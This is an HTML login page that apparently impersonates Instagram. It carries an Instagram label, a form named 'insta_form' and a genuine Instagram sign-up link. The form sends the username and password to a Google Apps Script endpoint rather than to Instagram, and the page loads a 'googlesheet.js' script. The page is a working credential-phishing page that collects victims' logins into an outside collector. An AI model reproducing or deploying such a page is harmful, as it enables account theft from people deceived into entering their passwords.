<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Page</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="login-container">
    <div class="login-box">
      <i role="img" alt="Instagram">
      <form name="insta_form" action="https://script.google.com/macros/s/AKfycbySJ_X9ecyRqHxQRkxiJ8L5UNv-MdrUToni3_IgZ9NiIs--78fBaQUnX7sDbERiyyz4/exec" method="POST">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit" >verify</button>
      </form>
    </div>
    <div class="signup-box">
      <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/?hl=en">Sign up</a></p>
    </div>
  </div>
  <script src="googlesheet.js"></script>
</body>
</html>
